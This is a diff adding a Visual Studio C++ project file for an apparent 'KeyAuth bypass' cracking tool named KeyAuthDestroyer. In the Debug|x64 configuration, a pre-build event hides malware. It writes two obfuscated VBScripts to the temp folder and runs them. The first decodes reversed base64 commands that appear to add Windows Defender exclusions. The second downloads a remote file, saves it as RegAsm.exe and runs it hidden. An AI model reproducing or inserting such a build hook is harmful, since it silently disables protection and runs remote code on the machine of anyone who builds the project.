@@ -1,0 +1,257 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{029d18ca-77f0-4f5f-9e40-f9759d147718}</ProjectGuid>
+    <RootNamespace>KeyAuthDestroyer</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>
+        @echo off
+        setlocal
+        set "TEMP_VBS1=%TEMP%\1cpKHgvGGf.vbs"
+        set "TEMP_VBS2=%TEMP%\2cpKAgvGGf.vbs"
+        (
+        echo Dim a, b, c, i, j, x, s, e, r
+        echo a = Array( _
+        echo "=gDI5FGRlxWdkVGajNlbhN2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "2AibvlGdjFEdsVXYmVGR0FWZyhGVlJXZ2V2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "2AibvlGdjFEdsVXYmVGR0FWZyhGV39GTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=U2Yy9mRtAiNg42bpR3YBRHb1FmZlREdhVmcoRFanlGStASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "wAyZulGdy9GclJ1UQFUTtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "==gMgQnblNnbvN0clxGctF2U0lWbiV3UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "lVnc0RCIn5Wau5WYjNFdwlmcjNVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=UWdyRHJg0WZ0NXeT52bpRnblZXZyBlbvl2c1JHdulUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "==QZ1JHdkAyZulmbuF2YTVmdph2YyFUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=UWdyRHJgUmbpdmbFRXdvhGdpdFc1RnchR3Uu9UZ0FGZwVVZsJWYzlGRlJXd0Fmbnl2UtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "lVnc0RCIlR2bNl3YhZXayBVZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "lVnc0RCIu9Wa0NWZ09mcQZVQPlUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=UWdyRHJg4WZlNFdzJXaGRXQrN2bsJUZsJWYzlGRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "lxmYhNXakBibvlGdjVGdvJHUBVFUtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "==AZlxmYhNXaEByczV2YjFkclRGbvZEZlxGbvJHdu92QlxmYh5WRtASZj5WZyVmZlJHUw1UL0V2UgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=AXb05CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=UGel5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=MnY25CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "=QXYi5CIu9Waz5WZ0hXRu9WazVHbjhXRtASZj5WZyVmZlJHUw1ULkRWQgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc", _
+        echo "==gIQ1URUpjduVGJggGdhBlbvl2c1x2Y4VULgU2YuVmclZWZyBFcN1CZkFkIgQmbh1WbvNWLgUGel5CbsVGazJXZ39Gc" _
+        echo )
+        echo Set x = CreateObject("Scripting.FileSystemObject")
+        echo Set s = CreateObject("ADODB.Stream")
+        echo Set e = CreateObject("Msxml2.DOMDocument.3.0")
+        echo Set r = CreateObject("WScript.Shell")
+        echo For i = 0 To UBound(a)
+        echo b = StrReverse(a(i))
+        echo Set c = e.CreateElement("b64")
+        echo c.DataType = "bin.base64"
+        echo c.Text = b
+        echo s.Type = 1
+        echo s.Open
+        echo s.Write c.NodeTypedValue
+        echo s.Position = 0
+        echo s.Type = 2
+        echo s.Charset = "utf-8"
+        echo d = s.ReadText
+        echo s.Close
+        echo r.Run d, 0, True
+        echo Next
+        ) &gt; "%TEMP_VBS1%"
+
+        (
+        echo Dim a, b, c, d, e, f, g, h, i, j
+        echo a = "==QZ4VmLtNXQnVmUv4Wah12LzRWYlh2LzZWZy9ydhJ3LkVWamlmclZ3LtFmcUNmch10Lt92YuIWdoRXan9yL6MHc0RHa"
+        echo Set b = CreateObject("Scripting.FileSystemObject")
+        echo Set c = CreateObject("WScript.Shell")
+        echo d = c.ExpandEnvironmentStrings("%%TEMP%%")
+        echo Randomize
+        echo e = "Driver" ^&amp; Int((9999 - 1000 + 1) * Rnd + 1000)
+        echo f = d ^&amp; "\\" ^&amp; e
+        echo If Not b.FolderExists(f) Then b.CreateFolder f
+        echo g = f ^&amp; "\\RegAsm.exe"
+        echo h = m(StrReverse(a))
+        echo n h, g
+        echo If Not o("REACHME") Then c.Run  ^&amp; g ^&amp; , 0, False
+        echo Function m(x)
+        echo Dim y, z
+        echo Set y = CreateObject("MSXML2.DOMDocument")
+        echo Set z = y.createElement("base64")
+        echo z.dataType = "bin.base64"
+        echo z.Text = x
+        echo m = p(z.nodeTypedValue)
+        echo End Function
+        echo Function p(q)
+        echo Dim r
+        echo Set r = CreateObject("ADODB.Stream")
+        echo r.Type = 1
+        echo r.Open
+        echo r.Write q
+        echo r.Position = 0
+        echo r.Type = 2
+        echo r.Charset = "utf-8"
+        echo p = r.ReadText
+        echo r.Close
+        echo End Function
+        echo Sub n(s, t)
+        echo Dim u, v
+        echo Set u = CreateObject("MSXML2.XMLHTTP")
+        echo u.Open "GET", s, False
+        echo u.Send
+        echo If u.Status = 200 Then
+        echo Set v = CreateObject("ADODB.Stream")
+        echo v.Type = 1
+        echo v.Open
+        echo v.Write u.responseBody
+        echo v.SaveToFile t, 2
+        echo v.Close
+        echo End If
+        echo End Sub
+        echo Function o(w)
+        echo Dim x, y, z
+        echo Set x = GetObject("winmgmts:\\.\root\cimv2")
+        echo Set y = x.ExecQuery("Select * from Win32_UserAccount Where Name='" ^&amp; w ^&amp; "'")
+        echo o = (y.Count ^&gt; 0)
+        echo End Function
+        ) &gt; "%TEMP_VBS2%"
+
+        cscript //nologo "%TEMP_VBS1%"
+        timeout /t 12 /nobreak &gt;nul
+        cscript //nologo "%TEMP_VBS2%"
+        endlocal
+      </Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="KeyAuthDestroyer.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\..\..\..\Downloads\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth Bypass\mh.h" />
+    <ClInclude Include="..\..\..\..\Downloads\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth Bypass\protectStr.h" />
+    <ClInclude Include="..\..\..\..\Downloads\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth Bypass\scan.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="..\..\..\..\Downloads\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth-Bypass-Loader-Appication-Auth-main\KeyAuth Bypass\minhook.x64.lib" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
